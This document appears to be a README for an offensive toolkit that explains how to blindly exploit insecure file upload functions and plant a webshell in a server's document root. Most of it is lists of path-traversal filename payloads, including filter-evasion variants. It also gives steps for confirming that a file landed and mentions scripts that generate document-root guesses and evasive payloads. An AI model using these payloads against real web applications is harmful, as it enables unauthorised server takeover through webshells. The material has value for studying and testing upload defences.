Blindly exploiting insecure file upload implementations

The general assumptions are as follows:
- we have a file upload function in the application and we have some sample, valid file that is accepted (e.g. a JPEG image)
- our goal is to upload an executable (a webshell), but we do not know what the remote document root is, we also do not know what are the file upload restrictions in place

First of all, we will attempt to find a way to reach the document root. After we achieve that, we can focus on uploading malicious files instead of legitimate ones. It is better to start with a legitimate file in order to decrease the likehood of failure due to forbidden content/extension and focus on reaching the document root first.

1) Reaching the document root

There are two scenarios we may face when blindly attacking the upload dir:

a) the upload dir is located in the document root, in such case we should do fine without knowing its path at all, as it should be sufficient to attack with path traversal payloads reflecting several layers of nesting in order to hit the document root itself. It might be reasonable to employ a basic evasive technique at this point already (for non-recursive removals of '../' and './':

./../test.jpg
./../../test.jpg
./../../../test.jpg
./../../../../test.jpg
./../../../../../test.jpg
./../../../../../../test.jpg
./../../../../../../../test.jpg
./../../../../../../../../test.jpg


./....//test.jpg
./....//....//test.jpg
./....//....//....//test.jpg
./....//....//....//....//test.jpg
./....//....//....//....//....//test.jpg
./....//....//....//....//....//....//test.jpg
./....//....//....//....//....//....//....//test.jpg
./....//....//....//....//....//....//....//....//test.jpg


..//...//test.jpg
..//...//...//test.jpg
..//...//...//...//test.jpg
..//...//...//...//...//test.jpg
..//...//...//...//...//...//test.jpg
..//...//...//...//...//...//...//test.jpg
..//...//...//...//...//...//...//...//test.jpg
..//...//...//...//...//...//...//...//...//test.jpg

After the series of file upload attempts, we check the document root for existance of the file we tried to create:
http://example.org/test.jpg


b) the upload directory is located outside the document root, that is why we need to employ both directory traversal and full document root path guessing. Please use the get_docroots.pl script in order to generate the payloads (it is based on the way --os-shell feature in sqlmap generates potential document roots). Then use them all and check for existance of the file in the document root.


2) Bypassing any file upload restrictions

If the file is there, we use the relevant traversal payload (the proper number of directories to jump out from is important) in order to bypass any file upload restrictions (extension, content, mime type, size, etc). We may want to employ evasive techniques and use payload_generator.pl to generate a full list of versions of the right payload, according to all supported evasive techniques.
